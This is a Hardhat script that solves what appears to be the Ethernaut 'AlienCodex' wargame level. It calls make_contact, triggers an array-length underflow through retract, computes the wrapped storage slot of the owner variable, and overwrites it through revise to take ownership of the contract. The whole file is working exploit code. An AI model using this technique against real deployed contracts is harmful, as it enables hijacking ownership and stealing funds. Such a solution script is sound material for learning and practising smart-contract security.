const hre = require("hardhat");

async function main() {
  const Victim = await ethers.getContractFactory("AlienCodex");
  const victim = await Victim.attach(
    "0x0e8a276C4C9e8A5090d0224173a5AA6F613548c0" // This is the contract address that you get from starting your instance
  );

  // Check the initial value of contact and owner
  const value1 = await victim.contact();
  console.log("The initial value of contact is ", value1);
  const owner1 = await victim.owner();
  console.log("The initial owner is ", owner1);

  // Change the state of contact to pass modifiers
  const attack1 = await victim.make_contact();
  await attack1.wait(1);

  // Check that the value of contact has changed
  const value2 = await victim.contact();
  console.log("The new value of contact is ", value2);

  // Call the retract function to gain access to all the storage because of the underflow
  const attack2 = await victim.retract();
  await attack2.wait(1);

  // Get the storage position of the variable owner in the array
  const codexBegin = hre.ethers.BigNumber.from(
    ethers.utils.keccak256(
      `0x0000000000000000000000000000000000000000000000000000000000000001`
    )
  );
  const ownerOffset = hre.ethers.BigNumber.from(`2`).pow(`256`).sub(codexBegin);
  console.log("The 0th position hashed is ", ownerOffset.toString());

  // The address has to be padded with zeros since it only ocupies a proportion of the slot
  const addresspadded = "0x" + "0".repeat(24) + process.env.PUBLIC_KEY.slice(2);
  console.log("Our address padded is ", addresspadded);

  // Call revise function passing right position and our padded address
  const attack3 = await victim.revise(ownerOffset, addresspadded);
  await attack3.wait(1);

  // Verify who the owner is now
  const owner2 = await victim.owner();
  console.log("Now the owner is ", owner2);
}

// Recommended pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
